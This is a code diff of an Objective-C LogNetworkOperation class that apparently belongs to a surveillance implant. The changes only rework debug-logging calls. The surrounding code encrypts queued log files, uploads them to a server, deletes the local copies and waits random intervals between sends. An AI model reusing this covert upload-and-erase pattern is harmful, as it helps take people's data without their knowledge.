@@ -16,11 +16,10 @@
 
 #import "NSString+SHA1.h"
 #import "NSData+SHA1.h"
-#import "NSData+Pascal.h"
 
 #import "RCSMCommon.h"
-
-//#define DEBUG_LOG_NOP
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 @interface LogNetworkOperation (private)
@@ -34,13 +33,13 @@
 - (BOOL)_sendLogContent: (NSData *)aLogData
 {
 #ifdef DEBUG_LOG_NOP
-  infoLog(ME, @"");
+  infoLog(@"");
 #endif
   
   if (aLogData == nil)
     {
 #ifdef DEBUG_LOG_NOP
-      errorLog(ME, @"aLogData is nil");
+      errorLog(@"aLogData is nil");
 #endif
       
       return NO;
@@ -64,7 +63,7 @@
   [commandData appendData: commandSha];
   
 #ifdef DEBUG_LOG_NOP
-  infoLog(ME, @"commandData: %@", commandData);
+  infoLog(@"commandData: %@", commandData);
 #endif
   
   [commandData encryptWithKey: gSessionKey];
@@ -83,7 +82,7 @@
   [replyDecrypted decryptWithKey: gSessionKey];
   
 #ifdef DEBUG_LOG_NOP
-  infoLog(ME, @"replyDecrypted: %@", replyDecrypted);
+  infoLog(@"replyDecrypted: %@", replyDecrypted);
 #endif
   
   [replyDecrypted getBytes: &command
@@ -109,7 +108,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_LOG_NOP
-      errorLog(ME, @"exception on sha makerange (%@)", [e reason]);
+      errorLog(@"exception on sha makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -122,14 +121,14 @@
   shaLocal = [shaLocal sha1Hash];
   
 #ifdef DEBUG_LOG_NOP
-  infoLog(ME, @"shaRemote: %@", shaRemote);
-  infoLog(ME, @"shaLocal : %@", shaLocal);
+  infoLog(@"shaRemote: %@", shaRemote);
+  infoLog(@"shaLocal : %@", shaLocal);
 #endif
   
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
 #ifdef DEBUG_LOG_NOP
-      errorLog(ME, @"sha mismatch");
+      errorLog(@"sha mismatch");
 #endif
       
       [replyDecrypted release];
@@ -142,7 +141,7 @@
   if (command != PROTO_OK)
     {
 #ifdef DEBUG_LOG_NOP
-      errorLog(ME, @"Server issued a PROTO_%d", command);
+      errorLog(@"Server issued a PROTO_%d", command);
 #endif
       
       [replyDecrypted release];
@@ -178,7 +177,7 @@
       mBandwidthLimit     = aBandwidth;
       
 #ifdef DEBUG_LOG_NOP
-      infoLog(ME, @"mTransport: %@", mTransport);
+      infoLog(@"mTransport: %@", mTransport);
 #endif
       return self;
     }
@@ -194,7 +193,7 @@
 - (BOOL)perform
 {
 #ifdef DEBUG_LOG_NOP
-  infoLog(ME, @"");
+  infoLog(@"");
 #endif
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -206,13 +205,13 @@
   if ([logManager closeActiveLogsAndContinueLogging: TRUE] == YES)
     {
 #ifdef DEBUG_LOG_NOP
-      infoLog(ME, @"Active logs closed correctly");
+      infoLog(@"Active logs closed correctly");
 #endif
     }
   else
     {
 #ifdef DEBUG_LOG_NOP
-      errorLog(ME, @"An error occurred while closing active logs (non-fatal)");
+      errorLog(@"An error occurred while closing active logs (non-fatal)");
 #endif
     }
   
@@ -222,7 +221,7 @@
   if (enumerator == nil)
     {
 #ifdef DEBUG_LOG_NOP
-      warnLog(ME, @"No logs in queue, searching on local folder");
+      warnLog(@"No logs in queue, searching on local folder");
 #endif
     }
   else
@@ -236,7 +235,7 @@
           NSString *logName = [[anObject objectForKey: @"logName"] copy];
           
 #ifdef DEBUG_LOG_NOP
-          infoLog(ME, @"Sending log: %@", logName);
+          infoLog(@"Sending log: %@", logName);
 #endif
           
           if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
@@ -254,7 +253,7 @@
                                                              error: nil] == NO)
                 {
 #ifdef DEBUG_LOG_NOP
-                  errorLog(ME, @"Error while removing (%@) from fs", logPath);
+                  errorLog(@"Error while removing (%@) from fs", logPath);
 #endif
                 }
               
@@ -278,7 +277,7 @@
               int sleepTime = rand() % (mMaxDelay - mMinDelay) + mMinDelay;
               
 #ifdef DEBUG_LOG_NOP
-              infoLog(ME, @"Sleeping %d seconds", sleepTime);
+              infoLog(@"Sleeping %d seconds", sleepTime);
 #endif
               
               sleep(sleepTime);
